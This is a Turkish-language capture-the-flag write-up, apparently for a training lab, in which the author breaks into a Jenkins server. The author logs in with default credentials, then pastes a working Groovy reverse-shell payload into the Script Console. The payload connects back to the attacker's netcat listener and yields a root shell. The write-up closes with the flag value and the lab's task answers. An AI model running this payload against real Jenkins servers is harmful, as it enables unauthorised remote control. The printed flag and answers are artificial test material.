## 1. Keşif

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.209
```

<img width="767" height="275" alt="nmap" src="https://github.com/user-attachments/assets/844ea09a-4f8d-439b-a597-787b5d65a8d9" />


Hedefte tek bir port açık: **8080/tcp**, üzerinde **Jetty 9.4.39** web sunucusu çalışıyor. Jetty, Java tabanlı uygulamalar için sıkça kullanılan bir servlet konteyneri/web sunucusu — bu da bana Java ekosisteminde bir şey (Jenkins, Tomcat, vb.) çalışıyor olabileceği fikrini veriyor.

---

## 2. Web Servisinin İncelenmesi — Jenkins Tespiti

<img width="370" height="434" alt="jenkiys" src="https://github.com/user-attachments/assets/4a4aca2d-83c4-473b-adf3-8d9893a220ec" />

Tarayıcıdan doğrudan `http://10.129.184.209:8080` adresine gidiyorum. Karşıma bir **Jenkins** giriş (login) sayfası çıkıyor. Herhangi bir ek bilgi görünmüyor bu aşamada, sadece kullanıcı adı/parola alanları var.
 
Jenkins, CI/CD (Continuous Integration/Continuous Deployment) süreçlerinde yaygın kullanılan bir otomasyon sunucusu. Yanlış yapılandırılmış veya varsayılan kimlik bilgileriyle bırakılmış Jenkins kurulumları, genellikle doğrudan **Remote Code Execution (RCE)**'a giden çok kısa bir yol sunar — çünkü Jenkins'in yerleşik **Script Console** özelliği, yetkili kullanıcının sunucu üzerinde keyfi Groovy kodu çalıştırmasına izin verir.
 
---
 
## 3. Kimlik Doğrulama — Varsayılan Kimlik Bilgileri
 
Login ekranında ilk aklıma gelen, Jenkins'te sıkça karşılaşılan varsayılan/zayıf kimlik bilgilerini denemek. Birkaç kombinasyonu manuel olarak deniyorum ve bir süre sonra:
 
```
Kullanıcı adı: root
Parola:        password
```
 
ile başarılı bir şekilde giriş yapabiliyorum. Bu, Jenkins panelinin hiç sertleştirilmemiş (hardening yapılmamış), fabrika ayarlarına yakın bırakıldığını gösteriyor — gerçek dünyada da sıkça karşılaşılan bir yanlış yapılandırma türü.
 
Giriş yaptıktan sonra panelin ana ekranında (dashboard) sağ alt köşede sürüm bilgisi karşıma çıkıyor:
 
```
Jenkins 2.289.1
```
<img width="305" height="86" alt="sürüm" src="https://github.com/user-attachments/assets/10549ea2-c1ed-401c-ba6f-89863fb26431" />
 
Bu bilgiyi not ediyorum.
 
---
 
## 4. Script Console Üzerinden RCE
 
Giriş yaptıktan sonra doğrudan Jenkins'in Script Console adresine gidiyorum:
 
```
http://10.129.184.209:8080/script
```
<img width="1901" height="646" alt="scriptconsole" src="https://github.com/user-attachments/assets/c473fb5d-4290-442f-b2c5-c1b9185121d2" />
 
Sayfa beni şu mesajla karşılıyor:
 
> Type in an arbitrary **Groovy script** and execute it on the server.
 
Bu, tam olarak beklediğim şey: yetkili bir kullanıcı olarak sunucu üzerinde doğrudan Groovy (dolayısıyla JVM üzerinden herhangi bir sistem komutu) çalıştırabiliyorum. Groovy tabanlı bir **reverse shell** payload'ı arıyorum ve şu kaynağa ulaşıyorum:
 
> https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
 
Kullandığım payload:
 
```groovy
String host="10.10.14.156";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
 
`host` değişkenini kendi (attacker) IP'me, `port` değişkenini de dinleyeceğim porta göre ayarlıyorum.
 
---
 
## 5. Listener Hazırlığı ve Shell Alımı
 
Payload'ı göndermeden önce kendi makinemde bir Netcat listener açıyorum:
 
```bash
nc -nvlp 4444
```
 
Ardından Groovy script'ini Jenkins Script Console'daki metin kutusuna yapıştırıp **Run** butonuna basıyorum.
 
**Sonuç:**
 
```
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.156] from (UNKNOWN) [10.129.184.209] 60674
```
 
Bağlantı geldi — shell'im hazır. Hemen kim olduğumu kontrol ediyorum:
 
```bash
whoami
```
 
```
root
```
 
Jenkins servisinin doğrudan **root** yetkisiyle çalıştırıldığını görüyorum
---
 
## 6. Flag'in Ele Geçirilmesi
 
Root yetkim olduğu için doğrudan root'un home dizinine gidip flag'i okuyorum:
 
```bash
cd /root
ls
```
 
```
flag.txt
```
 
```bash
cat flag.txt
```
 
```
9cdfb439c7876e703e307864c9167a15
```

<img width="518" height="598" alt="flag" src="https://github.com/user-attachments/assets/ec3fd720-eac8-451a-9ac8-6fac086e5f8b" />


Flag başarıyla elde edildi. 🎉
 
 
## 8. Görev Soruları ve Cevapları
 
**Görev 1 — CVE kısaltması ne anlama geliyor?**
`Common Vulnerabilities and Exposures`
 
**Görev 2 — Siber güvenlikteki CIA üçlüsüne atıfta bulunan CIA'deki üç harf neyi temsil eder?**
`Confidentiality, Integrity, Availability`
 
**Görev 3 — 8080 portunda çalışan servisin sürümü nedir?**
`Jetty 9.4.39.v20210325`
 
**Görev 4 — Hedef sistemde hangi Jenkins sürümü çalışıyor?**
`Jenkins 2.289.1`
 
**Görev 5 — Jenkins Komut Dosyası Konsolu'nda girdi olarak hangi tür komut dosyaları kabul edilir?**
`Groovy`
 
**Görev 6 — Jenkins komut dosyası konsolunun yolu nedir?**
`/script`
 
**Görev 7 — `ip a` — Linux'ta ağ arayüzlerimizin bilgilerini görüntülemek için kullanabileceğimiz farklı bir komut nedir?**
`ifconfig`
 
**Görev 8 — Netcat'in UDP taşıma modunu kullanması için hangi anahtarı kullanmalıyız?**
`-u`
 
**Task 9 — What is the term used to describe making a target host initiate a connection back to the attacker host and then accepting commands and executing them?**
`Reverse shell`
 
**Tek Bayrak Gönder — Submit the flag located in root's home directory.**
`9cdfb439c7876e703e307864c9167a15`
